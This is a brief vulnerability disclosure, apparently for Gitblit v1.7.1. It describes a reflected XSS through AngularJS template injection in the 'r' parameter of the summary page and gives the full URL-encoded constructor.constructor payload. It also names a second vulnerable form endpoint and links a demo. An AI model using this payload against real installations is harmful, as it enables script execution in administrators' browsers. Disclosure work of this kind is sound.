Vulnerability: Angular Template Injection/Reflected XSS

Version: ```v1.7.1```


Authenticated: Yes

User: Admin

Vulnerable Parameter:
```r```

Payload:
```http://172.18.0.34/summary/?r=%7b%7bconstructor%2econstructor('alert(document.domain)')()%7d%7d```

Other locations are vulnerable as well, the POST request
```http://172.18.0.34/?wicket:interface=:101:searchForm::IFormSubmitListener::```

Will work as well but is not as easily weaponized

Tested on

```v1.7.1```

but unless that parameter is fixed it may just take a newer angular version payload to work

See demo

![](https://github.com/4rdr/proofs/blob/main/gifs/gitblit-v1.7.1-reflected-XSS-via-angularjs-expression.gif?raw=true)
